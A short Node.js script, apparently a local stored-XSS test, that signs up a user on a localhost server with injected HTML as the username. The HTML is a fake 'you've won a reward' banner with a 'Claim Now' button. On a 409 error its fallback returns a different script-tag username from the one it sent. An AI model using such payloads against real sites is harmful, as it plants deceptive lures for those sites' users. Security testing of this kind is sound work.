const axios = require('axios');

const SERVER_URL = 'http://localhost:5000';

async function createMaliciousUser() {
  try {
    const xssPayload = `<h1>Congratulations!</h1><p>You\'ve won a special reward!</p><a href=\"https://www.linkedin.com/\" style=\"display:inline-block;background-color:#0077B5;color:white;padding:15px 30px;text-decoration:none;font-size:18px;border-radius:5px;margin-top:20px\" target=\"_blank\">Claim Now</a></div>`;

    const payload = {
      username: xssPayload,
      password: "password123"
    };

    console.log('Step 1: Creating a user with XSS payload as username...');
    console.log('Payload:', payload);

    const response = await axios.post(`${SERVER_URL}/api/users/signup`, payload);

    console.log('Signup Response Status:', response.status);
    console.log('Signup Response Data:', response.data);

    if (response.status === 200) {
      console.log('Malicious user created successfully! XSS payload stored in database.');
      return payload;
    } else {
      console.log('Failed to create user with XSS payload.');
      return null;
    }
  } catch (error) {
    console.error('Error during signup:', error.response ? error.response.data : error.message);
    if (error.response && error.response.status === 409) {
      console.log('Username with XSS payload already exists. Proceeding to login...');
      return {
        username: '<script>alert("XSS Attack Successful!")</script>',
        password: "password123"
      };
    }
    return null;
  }
}

async function runXSSAttackSimulation() {
  const maliciousUser = await createMaliciousUser();
}

runXSSAttackSimulation();